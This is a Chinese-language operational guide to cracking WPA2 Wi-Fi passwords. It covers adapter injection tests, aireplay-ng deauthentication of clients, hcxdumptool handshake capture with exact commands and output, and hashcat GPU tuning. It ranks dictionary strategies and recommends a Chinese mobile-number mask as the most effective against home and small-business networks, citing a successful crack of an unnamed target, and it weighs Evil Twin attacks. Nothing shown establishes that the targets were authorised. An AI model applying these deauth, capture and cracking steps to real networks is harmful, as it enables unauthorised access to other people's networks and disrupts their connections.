# WPA 破解工具链：驱动能力边界、算力路径与实战攻击链

## 结论速查

| 决策点 | 结论 |
|---|---|
| **RTL8192FU 注入** | **可用**（Kali 7.1.5 + `rtl8xxxu` 实测 `aireplay-ng --test` 100% / 66%，deauth ACK 60+/64）。旧结论「不能注入」已推翻 |
| **VM 里抓包** | **可用**（VirtualBox + USB 直通，`hcxdumptool` 15 分钟抓到有效握手）。旧结论「VM 不可靠」已推翻 |
| 抓包环境 | Kali VM 足够；物理 Kali 不是必需 |
| 算力路径 | GPU 爆破必须在 Windows 原生或 WSL2；VirtualBox/VMware 无 GPU 计算直通 |
| runtime 预算 | `clamp(ceil(eta*1.2), 60, 14400)`，下限必须覆盖 hashcat 冷启动 |
| **优先字典** | **中国手机号 mask `1[3-9]xxxxxxxxx`** 命中率远高于 rockyou/规则变形 |
| Evil Twin（未知 PSK） | 协议层受限，待机客户端不上钩，成功率低 |

## 一、驱动能力边界

### RTL8192FU（USB 0BDA:F192）

- 2.4GHz 单频。Windows `netsh wlan show drivers` 报「2 个频段」是误报，以 radio types（b/g/n）为准
- Linux 内核 6.5 起内建 `rtl8xxxu`，无需第三方驱动
- `iw list` 报告支持的接口模式：`managed / AP / AP/VLAN / monitor`
- **监听模式可用，帧注入可用**
- 实测证据（Kali 7.1.5+kali-amd64）：
  - `aireplay-ng --test` 对近期 AP：30/30 = 100%、20/30 = 66%
  - `aireplay-ng --deauth` 定向踢客户端：ACK 60+/64，客户端确实掉线
- 限制：单物理网卡（phy0），monitor 与 AP 模式不能同时持有

### Intel AX210（PCIe 8086:2725，iwlwifi）

- 监听可收包；固件不支持帧注入
- 通常同时是唯一联网出口，`airmon-ng check kill` 会断网

### 芯片识别口径

只认 VID/PID 或 `netsh wlan show drivers` 的 INF + Provider。品牌名无用——同型号不同硬件版本会换芯片。

## 二、算力路径

- WPA 是 PBKDF2-HMAC-SHA1 4096 轮，纯 ALU 密集，几乎不吃带宽；eGPU 的 PCIe x4 通道损失 <2%
- hashcat 默认只枚举 GPU 后端：Linux 要 `pocl-opencl-icd` 才有 CPU 后端
- **RTX 50 系（Blackwell `sm_120`）的 CUDA 后端可能因 PTX 版本不匹配而失败**：
  ```
  ptxas: Unsupported .version 9.2; current version is '9.1'
  cuLinkAddData(): the provided PTX was compiled with an unsupported toolchain
  ```
  绕过：改用 NVIDIA 的 **OpenCL** 后端（`-d <OpenCL设备号> --backend-ignore-cuda`），性能损失可忽略

实测速率（`-m 22000`）：

| 设备 | 速率 |
|---|---|
| Radeon 780M（`-w 3`） | 131–148 kH/s |
| RTX 5070 Ti（OpenCL 后端，`-w 3`） | **1666 kH/s** |

## 三、runtime 预算

`--runtime <sec>` 从进程启动即计时，hashcat 冷启动（OpenCL 初始化）需 3.5–4.1 秒。按候选数算出的 runtime 低于冷启动时间时，该阶段会在初始化完成前被终止，且**表现为偶发白扔而非稳定失败**，最难排查。

```
runtime = clamp(ceil(预计耗时 * 1.2), 60, 14400)
```

覆盖率统计必须区分「下限抬升」（估算不可靠）与「上限截断」（算力不够）。

## 四、抓包：deauth 剂量是成败关键

**核心教训：deauth 过猛会杀死攻击本身。**

第一次尝试用 3 轮 × 8 帧定向 deauth，结果：

```
DEAUTHENTICATION (total): 6146   ← 客户端被持续压制
AUTHENTICATION (total):   6
ASSOCIATIONREQUEST:       1
EAPOL M1: 4  M3: 4  M2: 0        ← 缺 M2，组不成 message pair
hcxpcapngtool: no hashes written  ← 完全废数据
```

AP 会发 M3 说明它收到了 M2（协议上必然），但我们抓不到 M2——客户端刚连上就被再次踢开，握手走不完。

**有效做法**：锁定信道 + `hcxdumptool` 长时间持续攻击（15 分钟），让它自己管理节奏：

```
hcxdumptool -i wlan0 -w out.pcapng -c 10a --rds=3 --tot=15 --exitoneapol=15
```

结果：`EAPOL M32E2 (authorized - ANONCE from M3): 1`、`pairs written to 22000: 1`。

**判据只有一个**：`pairs written to 22000 hash file` 的计数。文件里有 EAPOL 帧不等于有可用握手。

### 信道锁定要验证

`iw dev wlan0 set channel 10` 之后必须核对 `iw dev wlan0 info`。信道跳变时客户端 M2 会落在别的信道上被漏掉。

## 五、字典策略：手机号 mask 是最高命中率

国内家庭/小商户 WiFi 口令大量是**机主手机号**。纯数字字典（如 8 位 mask）覆盖不到 11 位手机号，英文规则变形也造不出来。

实测命中过程（同一目标，累计约 1.5 小时）：

| 阶段 | 候选数 | 结果 |
|---|---|---|
| 中文/路由器默认 candidates | 120 | ❌ |
| rockyou 全量 | 14,344,384 | ❌ |
| ESSID 派生（含角色名/拼音变体） | 11,116 | ❌ |
| ESSID 派生 × best66 | 733,656 | ❌ |
| 8 位纯数字 mask | 100,000,000 | ❌ |
| rockyou × best66 | 946,729,344 | ❌ |
| **手机号 mask `1[3-9]?d×9`** | 7,000,000,000 | ✅ **83.62% 处命中（58.5 亿）** |

**结论：有中国场景线索时，手机号 mask 优先于 rockyou 规则变形。** 顺序建议：

1. 手机号 mask（约 70 分钟 @1.6 MH/s）
2. 小字典 × 大规则（`top100k × dive.rule`，1.65 小时）
3. 中字典 × 中规则（`top1m × d3ad0ne.rule`，5.7 小时）
4. 全字典 × 小规则（`rockyou × T0XlC.rule`，9.8 小时）

注意 `dive.rule` 有 98,676 条规则，直接乘全量 rockyou 需 236 小时，**不可行**；必须配小字典。

## 六、Evil Twin 对 WPA2-PSK 有协议层硬限制

未知 PSK 时建立假 AP，加密方式必然与真 AP 不符：

| 真 AP | 假 AP | 客户端行为 |
|---|---|---|
| WPA2-PSK | 开放网络 | **拒绝连接**（加密方式变化，判为可疑） |
| WPA2-PSK | 随机 PSK 的 WPA2 | 认证失败，弹「密码错误」但不交出密码 |

所以 Evil Twin 真正生效依赖**用户主动操作**：手动打开 WiFi 列表 → 看到熟悉 SSID 标「需要登录」→ 手动输入密码。

**待机客户端不会做任何一步**（连扫描都不扫）。实测 90 秒等待期 0 客户端关联。

附加限制：单物理网卡无法同时持有 monitor（deauth）与 AP 模式，deauth 结束到 AP 启动有 3–8 秒空窗，客户端通常已重连回真 AP。

要提升成功率需要第二张网卡，或者等客户端活跃且用户在场。

### 附带坑：hostapd 会改网卡 MAC

`hostapd` 启动后网卡 MAC 变成随机值，退出时不恢复。恢复方法：卸装驱动重载。

```
ip link set wlan0 down
modprobe -r rtl8xxxu && modprobe rtl8xxxu
ip link set wlan0 address <原MAC>
iw dev wlan0 set type managed
```

## 七、零硬件自检

不依赖任何无线设备即可验证「hashcat 能正确破解 WPA」：

```
PMK   = PBKDF2-HMAC-SHA1(password, essid, 4096, 32)
PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || STA_MAC)[:16]
```

按 22000 格式写出 `WPA*01*<pmkid>*<apmac>*<stamac>*<essid_hex>***`，配只含正确口令的字典，解出后断言明文相等。

**反向对照必做**：同一 hash 配错误字典必须解不出（rc=1 且无 outfile）。否则是空跑通过。

## 八、hashcat 调用约束

- 必须从 hashcat 自身目录运行（OpenCL 内核目录是相对路径），否则报 `./OpenCL/: No such file or directory`
- 全局包装器只能 `pushd` 到该目录；副作用是命令行相对路径参数失效，字典与 hash 必须传绝对路径
- `ADL2_Overdrive_Caps(): -8` 是 AMD APU 的 Overdrive 接口不支持，无害

## 验证一个密码是否正确的独立方法

不看 hashcat 输出，直接用 Python 重算 PMK 与 potfile 记录比对：

```python
pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), essid.encode(), 4096, 32)
# potfile 格式：<pmk_hex>*<essid_hex>:<password>
```

PMK 逐字节一致才是密码学确证。
